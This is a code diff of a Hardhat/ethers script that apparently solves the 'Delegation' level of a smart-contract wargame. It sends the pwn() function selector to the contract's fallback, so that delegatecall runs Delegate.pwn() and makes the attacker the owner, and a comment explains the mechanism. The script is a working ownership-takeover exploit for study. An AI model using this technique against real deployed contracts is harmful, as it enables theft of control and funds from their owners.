@@ -1,25 +1,15 @@
-import { Contract, Signer, Transaction } from "ethers";
-import { toUtf8CodePoints, UnsignedTransaction } from "ethers/lib/utils";
+import { Contract } from "ethers";
 import { ethers } from "hardhat";
-import { deployContract } from "../../utils/deployContract";
 import { abi } from "../../artifacts/contracts/6.Delegation/Delegate.sol/Delegate.json";
-import { exit } from "process";
+import { displayResult } from "../../utils/displayResult";
 
-function setTargetContract(signer?: Signer | undefined) {
-  const contractAddress = "0x31533F373d664321bb2edCAD35F56940978eeBbb";
-  return new Contract(contractAddress, abi);
-}
+const targetAddress = "0xF121Fdf903C0001793e53f0B014405C00Bc2A1b8";
 
 async function main() {
   const [attacker] = await ethers.getSigners();
-  const target = setTargetContract();
+  const target = new Contract(targetAddress, abi, attacker);
 
   const it = new ethers.utils.Interface(abi);
-
-  let owner = await target.connect(attacker).owner();
-
-  console.log("Proxy's owner: ", owner);
-
   const newTx = {
     data: it.getSighash("pwn"),
     to: target.address,
@@ -27,8 +17,8 @@ async function main() {
   };
   const tx = await attacker.sendTransaction(newTx);
   await tx.wait();
-  owner = await target.connect(attacker).owner();
-  console.log("Success: ", owner === attacker.address);
+  const owner = await target.connect(attacker).owner();
+  displayResult(owner === attacker.address);
 }
 
 main().catch((error) => {
@@ -37,8 +27,7 @@ main().catch((error) => {
 });
 
 /* Explanation :
-gasLimit must be set manually because ethers has difficulties evaluating gas cost 
-when using delegate call.
-+ in the delegate contract there is a piece of code that might increase gas costs
-
+Delegation because of its fallback function + delegatecall will call any function 
+inside the contract Delegate.sol in Delegation environnement. So we can call the function pwn() which will
+change the owner of the contract to the attacker address.
 */
